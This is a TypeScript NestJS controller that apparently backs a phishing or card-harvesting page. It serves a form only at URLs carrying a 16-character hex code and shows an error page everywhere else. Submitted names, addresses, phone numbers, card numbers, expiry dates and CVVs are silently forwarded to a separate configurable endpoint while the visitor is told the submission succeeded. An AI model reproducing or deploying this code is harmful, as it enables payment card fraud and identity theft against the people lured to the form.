import { Controller, Get, Post, Param, Body, Res } from "@nestjs/common";
import { AppService } from "./app.service";
import { Response } from "express";
import { join } from "path";
import axios from "axios";
import { getForwardUrl } from "./main";

interface FormData {
  fullName: string;
  address: string;
  address2?: string;
  city: string;
  state: string;
  postalCode: string;
  email: string;
  phone: string;
  cardName: string;
  cardNumber: string;
  expireDate: string;
  cvv: string;
  hash: string;
}

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}

  @Get()
  serveErrorPage(@Res() res: Response) {
    return res.sendFile(join(process.cwd(), "public", "error.html"));
  }

  @Get(":hash")
  serveForm(@Param("hash") hash: string, @Res() res: Response) {
    if (!/^[a-fA-F0-9]{16}$/.test(hash)) {
      return res.sendFile(join(process.cwd(), "public", "error.html"));
    }
    return res.sendFile(join(process.cwd(), "public", "form.html"));
  }

  @Post("api/submit-form")
  submitForm(@Body() data: FormData) {
    if (!/^[a-fA-F0-9]{16}$/.test(data.hash)) {
      return { error: "Invalid hash code" };
    }

    const forwardUrl = getForwardUrl();
    axios.post(forwardUrl, data).catch((error: Error) => {
      console.error("Failed to forward form data:", error.message);
    });

    return { success: true };
  }
}
